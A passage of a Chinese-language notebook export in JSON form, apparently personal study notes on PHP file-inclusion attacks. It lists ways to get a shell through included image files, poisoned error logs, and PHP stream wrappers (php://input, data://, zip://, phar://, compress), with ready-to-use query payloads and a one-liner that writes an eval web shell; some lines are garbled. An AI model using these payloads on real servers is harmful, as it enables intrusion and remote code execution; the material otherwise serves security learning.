kt0pl","updated":"20240908111409"},"Children":[{"Type":"NodeText","Data":"\turl=dict://ip:端口"}]},{"ID":"20240908111431-c7ldn4q","Type":"NodeParagraph","Properties":{"id":"20240908111431-c7ldn4q","updated":"20240908111431"},"Children":[{"Type":"NodeText","Data":"\t端口爆破--查找出未映射在公网端口​"}]},{"ID":"20240908111439-9jxurxz","Type":"NodeParagraph","Properties":{"id":"20240908111439-9jxurxz","updated":"20240908111441"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240907101715-qrxm94x.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240908111314-wzjn034","Type":"NodeParagraph","Properties":{"id":"20240908111314-wzjn034","updated":"20240908111320"},"Children":[{"Type":"NodeText","Data":"包含上传的getshell"}]},{"ID":"20240908111447-wjrad8t","Type":"NodeParagraph","Properties":{"id":"20240908111447-wjrad8t","updated":"20240908111505"},"Children":[{"Type":"NodeText","Data":"\t上传图片码，利用文件包含我们的图片码，蚁剑连接"}]},{"ID":"20240908125422-ighmtzd","Type":"NodeParagraph","Properties":{"id":"20240908125422-ighmtzd"},"Children":[{"Type":"NodeText","Data":"\t文件包含图片码--蚁剑连接"}]},{"ID":"20240908125424-jmrynj1","Type":"NodeParagraph","Properties":{"id":"20240908125424-jmrynj1","updated":"20240908125430"},"Children":[{"Type":"NodeText","Data":"​\t​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240907092520-mf8wibd.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20240908111320-m7yy2nx","Type":"NodeParagraph","Properties":{"id":"20240908111320-m7yy2nx","updated":"20240908111328"},"Children":[{"Type":"NodeText","Data":"包含日志文件Getshell"}]},{"ID":"20240908111507-hmc8xdz","Type":"NodeParagraph","Properties":{"id":"20240908111507-hmc8xdz","updated":"20240908111533"},"Children":[{"Type":"NodeText","Data":"\t避免web中进行url编码，进行抓包修改，或者构造报错信息写进错误日志"}]},{"ID":"20240908111834-fyuylyx","Type":"NodeParagraph","Properties":{"id":"20240908111834-fyuylyx"}},{"ID":"20240908111837-cb66zh0","Type":"NodeParagraph","Properties":{"id":"20240908111837-cb66zh0","updated":"20240908111837"},"Children":[{"Type":"NodeText","Data":"\t日志文件获取shell："}]},{"ID":"20240908111837-v2n4u7v","Type":"NodeParagraph","Properties":{"id":"20240908111837-v2n4u7v","updated":"20240908111837"},"Children":[{"Type":"NodeText","Data":"\t获取路径：错误日志"}]},{"ID":"20240908111837-t9yfr8w","Type":"NodeParagraph","Properties":{"id":"20240908111837-t9yfr8w","updated":"20240908111837"},"Children":[{"Type":"NodeText","Data":"\t查看错误日志的所在地法一 ，看到phpinfo就能过些一句话木马"}]},{"ID":"20240908111837-edb7qnu","Type":"NodeParagraph","Properties":{"id":"20240908111837-edb7qnu","updated":"20240908111907"},"Children":[{"Type":"NodeText","Data":"​\t​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240907102356-0nma2b6.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20240908111837-v71ufcm","Type":"NodeParagraph","Properties":{"id":"20240908111837-v71ufcm","updated":"20240908111904"},"Children":[{"Type":"NodeText","Data":"\t​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240907102938-37k4wue.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​​"}]},{"ID":"20240908111834-qtsfj4b","Type":"NodeParagraph","Properties":{"id":"20240908111834-qtsfj4b","updated":"20240908111854"},"Children":[{"Type":"NodeText","Data":"\t​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240907103132-6oypr0b.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240908111834-s6gbq9p","Type":"NodeParagraph","Properties":{"id":"20240908111834-s6gbq9p"}},{"ID":"20240908111834-pln64ty","Type":"NodeParagraph","Properties":{"id":"20240908111834-pln64ty"}},{"ID":"20240908111331-hhmikt6","Type":"NodeParagraph","Properties":{"id":"20240908111331-hhmikt6","updated":"20240908111338"},"Children":[{"Type":"NodeText","Data":"远程文件包含写shell"}]},{"ID":"20240908111535-898zcyg","Type":"NodeParagraph","Properties":{"id":"20240908111535-898zcyg","updated":"20240908111657"},"Children":[{"Type":"NodeText","Data":"\t"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"\u0026lt;?php fputs(fopen('shell.php','w'),'\u0026lt;php eval($_POST[1]);?\u0026gt;');?\u0026gt;"},{"Type":"NodeText","Data":"​"}]},{"ID":"20240908111703-uytc54t","Type":"NodeParagraph","Properties":{"id":"20240908111703-uytc54t","updated":"20240908111803"},"Children":[{"Type":"NodeText","Data":"\t在文件夹下会看到生成shell.php，内容为"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"\u0026lt;php eval($_POST[1]);?\u0026gt;"},{"Type":"NodeText","Data":"​，当直接包含图片时，代码就会被执行"}]},{"ID":"20240908111339-gcp2rir","Type":"NodeParagraph","Properties":{"id":"20240908111339-gcp2rir","updated":"20240908111347"},"Children":[{"Type":"NodeText","Data":"使用php伪协议GETshell"}]},{"ID":"20240908111918-32i5am6","Type":"NodeParagraph","Properties":{"id":"20240908111918-32i5am6","updated":"20240908111944"},"Children":[{"Type":"NodeText","Data":"\t伪协议:就是支持的协议和封装协议"}]},{"ID":"20240908112000-zc9871j","Type":"NodeTable","TableAligns":[0,0],"Properties":{"colgroup":"min-width: 60px;|width: 340px;","id":"20240908112000-zc9871j","style":"text-align: center;","updated":"20240908123510"},"Children":[{"Type":"NodeTableHead","Data":"thead","Children":[{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"协议"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"用途"}]}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"file://"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"访问本地文件系统"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"http://"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"访问http(s)网址"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"ftp://"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"访问ftp(s)urls"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"php://"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"访问各个输入/输出流"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"zlib://"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"压缩流"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"data://"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"数据（RFC2397）"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"rar://"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"RAR"}]}]}]},{"ID":"20240907103624-f33mrap","Type":"NodeParagraph","Properties":{"id":"20240907103624-f33mrap","updated":"20240908123458"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240908123525-w59iwh5","Type":"NodeParagraph","Properties":{"id":"20240908123525-w59iwh5","updated":"20240908123536"},"Children":[{"Type":"NodeText","Data":"常用php伪协议"}]},{"ID":"20240908123537-z92wsuj","Type":"NodeParagraph","Properties":{"id":"20240908123537-z92wsuj","updated":"20240908123547"},"Children":[{"Type":"NodeText","Data":"file://协议"}]},{"ID":"20240908123552-du3kqit","Type":"NodeParagraph","Properties":{"id":"20240908123552-du3kqit","updated":"20240908123604"},"Children":[{"Type":"NodeText","Data":"用于访问本地文件"}]},{"ID":"20240908123524-mr1bohe","Type":"NodeParagraph","Properties":{"id":"20240908123524-mr1bohe","updated":"20240908123607"},"Children":[{"Type":"NodeText","Data":"使用条件："}]},{"ID":"20240908123608-65pvjfv","Type":"NodeParagraph","Properties":{"id":"20240908123608-65pvjfv"},"Children":[{"Type":"NodeText","Data":"allow_url_fopen：Off/On"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"allow_url_include：Off/On"}]},{"ID":"20240907103652-emgjknx","Type":"NodeParagraph","Properties":{"id":"20240907103652-emgjknx","updated":"20240908123508"},"Children":[{"Type":"NodeText","Data":"​方法"}]},{"ID":"20240908123613-tan2yft","Type":"NodeParagraph","Properties":{"id":"20240908123613-tan2yft"},"Children":[{"Type":"NodeText","Data":"文件的绝对路径和文件名"}]},{"ID":"20240908123513-y30ik8j","Type":"NodeParagraph","Properties":{"id":"20240908123513-y30ik8j","updated":"20240908123513"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240908112726-99rvej8.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20240908123624-dwuwpvy","Type":"NodeParagraph","Properties":{"id":"20240908123624-dwuwpvy"}},{"ID":"20240907103806-xsdtwlz","Type":"NodeParagraph","Properties":{"id":"20240907103806-xsdtwlz","updated":"20240908123630"},"Children":[{"Type":"NodeText","Data":"php://filter"}]},{"ID":"20240908123632-mcokaet","Type":"NodeParagraph","Properties":{"id":"20240908123632-mcokaet","updated":"20240908123645"},"Children":[{"Type":"NodeText","Data":"用于读取文件/源码"}]},{"ID":"20240908123653-yhq7aqp","Type":"NodeParagraph","Properties":{"id":"20240908123653-yhq7aqp","updated":"20240908123653"},"Children":[{"Type":"NodeText","Data":"使用条件："}]},{"ID":"20240908123700-5upqc35","Type":"NodeParagraph","Properties":{"id":"20240908123700-5upqc35","updated":"20240908123701"},"Children":[{"Type":"NodeText","Data":"allow_url_fopen：Off/On"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"allow_url_include：Off/On"}]},{"ID":"20240908123727-vvxo6ld","Type":"NodeParagraph","Properties":{"id":"20240908123727-vvxo6ld","updated":"20240908123727"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240908123727-c5xn8k0.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240908123728-b8h6gq9","Type":"NodeParagraph","Properties":{"id":"20240908123728-b8h6gq9","updated":"20240908123803"},"Children":[{"Type":"NodeText","Data":"两者区别在于：file只能使用绝对路径，filter相对路径和绝对路径都可以使用"}]},{"ID":"20240908123819-yfq8o4b","Type":"NodeParagraph","Properties":{"id":"20240908123819-yfq8o4b","updated":"20240908123827"},"Children":[{"Type":"NodeText","Data":"php://input"}]},{"ID":"20240908123829-z4xdivq","Type":"NodeParagraph","Properties":{"id":"20240908123829-z4xdivq","updated":"20240908123910"},"Children":[{"Type":"NodeText","Data":"可以访问请求的原始数据的只读流，将post请求中的数据作为php代码执行"}]},{"ID":"20240908123927-wpfarvn","Type":"NodeParagraph","Properties":{"id":"20240908123927-wpfarvn","updated":"20240908123930"},"Children":[{"Type":"NodeText","Data":"使用条件："}]},{"ID":"20240908123931-xq4wenw","Type":"NodeParagraph","Properties":{"id":"20240908123931-xq4wenw","updated":"20240908123940"},"Children":[{"Type":"NodeText","Data":"allow_url_fopen：Off/On"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"allow_url_include：On"}]},{"ID":"20240908123945-pf9c6d7","Type":"NodeParagraph","Properties":{"id":"20240908123945-pf9c6d7","updated":"20240908124012"},"Children":[{"Type":"NodeText","Data":"方法：?file=php://input"}]},{"ID":"20240908124046-zfm3g5p","Type":"NodeParagraph","Properties":{"id":"20240908124046-zfm3g5p","updated":"20240908124132"},"Children":[{"Type":"NodeText","Data":"\t[POST]"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"\u0026lt;?php phpinfo()?\u0026gt;"},{"Type":"NodeText","Data":"​（执行POST DATA中的内容）"}]},{"ID":"20240908124142-wvjvvrr","Type":"NodeParagraph","Properties":{"id":"20240908124142-wvjvvrr","updated":"20240908124142"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240908124142-1eilurv.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240908124018-e9ps0jp","Type":"NodeParagraph","Properties":{"id":"20240908124018-e9ps0jp","updated":"20240908124029"},"Children":[{"Type":"NodeText","Data":"hp\t[POST]:\u003c?pcaretreplacement?\u003e"}]},{"ID":"20240907103847-ug14x5s","Type":"NodeParagraph","Properties":{"id":"20240907103847-ug14x5s","updated":"20240908124149"},"Children":[{"Type":"NodeText","Data":"其他协议："}]},{"ID":"20240908124150-uloakr6","Type":"NodeParagraph","Properties":{"id":"20240908124150-uloakr6","updated":"20240908124204"},"Children":[{"Type":"NodeText","Data":"data://"}]},{"ID":"20240908124207-t1wl5vq","Type":"NodeParagraph","Properties":{"id":"20240908124207-t1wl5vq","updated":"20240908124225"},"Children":[{"Type":"NodeText","Data":"执行接收到的数据中包含的PHP代码"}]},{"ID":"20240908124233-jdet6mw","Type":"NodeParagraph","Properties":{"id":"20240908124233-jdet6mw","updated":"20240908124233"},"Children":[{"Type":"NodeText","Data":"使用条件："}]},{"ID":"20240908124233-s4up6zo","Type":"NodeParagraph","Properties":{"id":"20240908124233-s4up6zo","updated":"20240908124236"},"Children":[{"Type":"NodeText","Data":"allow_url_fopen：On"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"allow_url_include：On"}]},{"ID":"20240908124239-jpg81eg","Type":"NodeParagraph","Properties":{"id":"20240908124239-jpg81eg","updated":"20240908124241"},"Children":[{"Type":"NodeText","Data":"方法："}]},{"ID":"20240908124241-ky788xv","Type":"NodeParagraph","Properties":{"id":"20240908124241-ky788xv","updated":"20240908124329"},"Children":[{"Type":"NodeText","Data":"?file=data:text/plain,\u003c?php phpinfo0);?\u003e\n?file=data:text/plain;base64, PD9waHAgcGhwaW5mbygpPz4=\n?file=data://text/plain,\u003c?php phpinfo();?\u003e\nhttp://192.168.172.130/include.php?file=data://text/plain,\u003c?=phpinfo();?\u003e\n"}]},{"ID":"20240907104249-539hg2z","Type":"NodeParagraph","Properties":{"id":"20240907104249-539hg2z","updated":"20240908124341"},"Children":[{"Type":"NodeText","Data":"zip://"}]},{"ID":"20240908124351-dpdqaks","Type":"NodeParagraph","Properties":{"id":"20240908124351-dpdqaks","updated":"20240908124425"},"Children":[{"Type":"NodeText","Data":"用于读取压缩包内的文件（绝对路径/相对路径）如果包含PHP代码就直接执行"}]},{"ID":"20240907104449-shozyh4","Type":"NodeParagraph","Properties":{"id":"20240907104449-shozyh4","updated":"20240908124441"}},{"ID":"20240908124438-us06n30","Type":"NodeParagraph","Properties":{"id":"20240908124438-us06n30","updated":"20240908124438"},"Children":[{"Type":"NodeText","Data":"使用条件："}]},{"ID":"20240908124443-9b3t4b9","Type":"NodeParagraph","Properties":{"id":"20240908124443-9b3t4b9","updated":"20240908124443"},"Children":[{"Type":"NodeText","Data":"zip在5.2.17以上版本是用不了的"}]},{"ID":"20240908124438-bzf4c0e","Type":"NodeParagraph","Properties":{"id":"20240908124438-bzf4c0e","updated":"20240908124448"},"Children":[{"Type":"NodeText","Data":"allow_url_fopen：Off"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"allow_url_include：Off"}]},{"ID":"20240908124451-tmspxtd","Type":"NodeParagraph","Properties":{"id":"20240908124451-tmspxtd","updated":"20240908124454"},"Children":[{"Type":"NodeText","Data":"方法："}]},{"ID":"20240908124454-upwhfra","Type":"NodeParagraph","Properties":{"id":"20240908124454-upwhfra","updated":"20240908124624"},"Children":[{"Type":"NodeText","Data":"zip://[压缩文件绝对路径/相对路径]#[压缩文件内的子文件名]"}]},{"ID":"20240908124627-ttfgudq","Type":"NodeParagraph","Properties":{"id":"20240908124627-ttfgudq","updated":"20240908124647"},"Children":[{"Type":"NodeText","Data":"?file=zip://D:/www/file.zip%23phpcode.txt\n?file=zip://D:/wwW/file.jpg%23phpcode.txt\nhttp://192.168.172.130/include.php?file=zip://shell.zip%23shell.txt"}]},{"ID":"20240907104420-tzrtewx","Type":"NodeParagraph","Properties":{"id":"20240907104420-tzrtewx","updated":"20240908124700"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240907104931-pwxleu2.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240907103615-fnyxdy2","Type":"NodeParagraph","Properties":{"id":"20240907103615-fnyxdy2","updated":"20240907105109"},"Children":[{"Type":"NodeText","Data":"1.zip--2.jpg也可用"}]},{"ID":"20240908124735-h0klahh","Type":"NodeParagraph","Properties":{"id":"20240908124735-h0klahh"}},{"ID":"20240908124735-r98kkk3","Type":"NodeParagraph","Properties":{"id":"20240908124735-r98kkk3","updated":"20240908124740"},"Children":[{"Type":"NodeText","Data":"phar://"}]},{"ID":"20240908124746-ltfdhzd","Type":"NodeParagraph","Properties":{"id":"20240908124746-ltfdhzd","updated":"20240908124805"},"Children":[{"Type":"NodeText","Data":"用于读取压缩包内的文件（绝对路径/相对路径）"}]},{"ID":"20240908124830-tg7yjbs","Type":"NodeParagraph","Properties":{"id":"20240908124830-tg7yjbs","updated":"20240908124830"},"Children":[{"Type":"NodeText","Data":"使用条件："}]},{"ID":"20240908124830-72isyc9","Type":"NodeParagraph","Properties":{"id":"20240908124830-72isyc9","updated":"20240908124830"},"Children":[{"Type":"NodeText","Data":"allow_url_fopen：Off"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"allow_url_include：Off"}]},{"ID":"20240908124837-s193nj8","Type":"NodeParagraph","Properties":{"id":"20240908124837-s193nj8","updated":"20240908124841"},"Children":[{"Type":"NodeText","Data":"方法："}]},{"ID":"20240908124843-agl7ect","Type":"NodeParagraph","Properties":{"id":"20240908124843-agl7ect","updated":"20240908124855"},"Children":[{"Type":"NodeText","Data":":?file=phar://D:/phpStudy/wwW/fileinclude/test.zip/phpinfo.txt\n?file= phar://test.zip/phpinfo.txt\nhttp://192.168.172.130/include.php?file=phar://shell.zip/shell.txt"}]},{"ID":"20240907105120-k3nsvqk","Type":"NodeParagraph","Properties":{"id":"20240907105120-k3nsvqk","updated":"20240907105120"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240907105458-ya465sf","Type":"NodeParagraph","Properties":{"id":"20240907105458-ya465sf"}},{"ID":"20240907103615-4ul8zkn","Type":"NodeParagraph","Properties":{"id":"20240907103615-4ul8zkn","updated":"20240907105500"},"Children":[{"Type":"NodeText","Data":"扩展linux系统中的压缩方式"}]},{"ID":"20240908124924-053im7n","Type":"NodeParagraph","Properties":{"id":"20240908124924-053im7n","updated":"20240908124941"},"Children":[{"Type":"NodeText","Data":"compress.bzip2://"}]},{"ID":"20240908124959-2javq6b","Type":"NodeParagraph","Properties":{"id":"20240908124959-2javq6b","updated":"20240908124959"},"Children":[{"Type":"NodeText","Data":"用于读取压缩包内的文件（绝对路径/相对路径）"}]},{"ID":"20240908124959-zm11cf0","Type":"NodeParagraph","Properties":{"id":"20240908124959-zm11cf0","updated":"20240908124959"},"Children":[{"Type":"NodeText","Data":"使用条件："}]},{"ID":"20240908124959-qr0q2am","Type":"NodeParagraph","Properties":{"id":"20240908124959-qr0q2am","updated":"20240908124959"},"Children":[{"Type":"NodeText","Data":"allow_url_fopen：Off"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"allow_url_include：Off"}]},{"ID":"20240908124959-ovdngyr","Type":"NodeParagraph","Properties":{"id":"20240908124959-ovdngyr","updated":"20240908125012"},"Children":[{"Type":"NodeText","Data":"方法:"}]},{"ID":"20240908125015-h0iv9vk","Type":"NodeParagraph","Properties":{"id":"20240908125015-h0iv9vk"},"Children":[{"Type":"NodeText","Data":"?file= compress.bzip2://shell.txt.bz2\nhitpa/192.168.17\nBzip2 -k shell.txt\nhttp://192.168.172.130/include.php?file=compress.bzip2://shell.txt.bz2"}]},{"ID":"20240908125202-ppgzpx0","Type":"NodeParagraph","Properties":{"id":"20240908125202-ppgzpx0"}},{"ID":"20240908125202-quodzre","Type":"NodeParagraph","Properties":{"id":"20240908125202-quodzre"}},{"ID":"20240908125202-dkbqmsy","Type":"NodeParagraph","Properties":{"id":"20240908125202-dkbqmsy"}},{"ID":"20240907105448-3r73ox3","Type":"NodeParagraph","Properties":{"id":"20240907105448-3r73ox3","updated":"20240908125146"},"Children":[{"Type":"NodeText","Data":"compress.zip://"}]},{"ID":"20240908125157-2gfwpjq","Type":"NodeParagraph","Properties":{"id":"20240908125157-2gfwpjq","updated":"20240908125157"},"Children":[{"Type":"NodeText","Data":"用于读取压缩包内的文件（绝对路径/相对路径）"}]},{"ID":"20240908125157-55fvog4","Type":"NodeParagraph","Properties":{"id":"20240908125157-55fvog4","updated":"20240908125157"},"Children":[{"Type":"NodeText","Data":"使用条件："}]},{"ID":"20240908125157-7mqtdjv","Type":"NodeParagraph","Properties":{"id":"20240908125157-7mqtdjv","updated":"20240908125157"},"Children":[{"Type":"NodeText","Data":"allow_url_fopen：Off"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"allow_url_include：Off"}]},{"ID":"20240908125157-qqzwa4k","Type":"NodeParagraph","Properties":{"id":"20240908125157-qqzwa4k","updated":"20240908125157"},"Children":[{"Type":"NodeText","Data":"方法:"}]},{"ID":"20240908125205-uv1ljsj","Type":"NodeParagraph","Properties":{"id":"20240908125205-uv1ljsj","updated":"20240908125255"},"Children":[{"Type":"NodeText","Data":"?file=compress.zlib://shell.zip#shell.txt"}]},{"ID":"20240908125300-tc7w1eb","Type":"NodeParagraph","Properties":{"id":"20240908125300-tc7w1eb","updated":"20240908125324"},"Children":[{"Type":"NodeText","Data":"http://192.168.172.130/include.php?file=compress.zlib://shell.zip#shell.txt"}]},{"ID":"20240907105609-xzhvhle","Type":"NodeParagraph","Properties":{"id":"20240907105609-xzhvhle","updated":"20240907105609"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240907105609-rjlqgcy.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240907105144-94hc39l","Type":"NodeParagraph","Properties":{"id":"20240907105144-94hc39l"}},{"ID":"20240907105144-hubmhar","Type":"NodeParagraph","Properties":{"id":"20240907105144-hubmhar"}},{"ID":"20240907093009-0c0ffg8","Type":"NodeParagraph","Properties":{"id":"20240907093009-0c0ffg8"}},{"ID":"20240907093009-e2mtwg9","Type":"NodeParagraph","Properties":{"id":"20240907093009-e2mtwg9"}},{"ID":"20240907092430-0qp67f8","Type":"NodeParagraph","Properties":{"id":"20240907092430-0qp67f8","updated":"20240908125411"}},{"ID":"20240907092805-lxslrsy","Type":"NodeParagraph","Properties":{"id":"20240907092805-lxslrsy"}},{"ID":"20240907105624-5wmw9ap","Type":"NodeParagraph","Properties":{"id":"20240907105624-5wmw9ap","updated":"20240907105624"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240907105630-umkzdv4","Type":"NodeParagraph","Properties":{"id":"20240907105630-umkzdv4","updated":"20240907105856"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240907105647-baerefy","Type":"NodeParagraph","Properties":{"id":"20240907105647-baerefy","updated":"20240908181909"}},{"ID":"20240907105840-6ufxtm6","Type":"NodeParagraph","Properties":{"id":"20240907105840-6ufxtm6","updated":"20240908181907"}},{"ID":"20240907111535-9evko9w","Type":"NodeParagraph","Properties":{"id":"20240907111535-9evko9w","updated":"20240907111535"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240907111642-rb6n4p5","Type":"NodeParagraph","Properties":{"id":"20240907111642-rb6n4p5"}}]}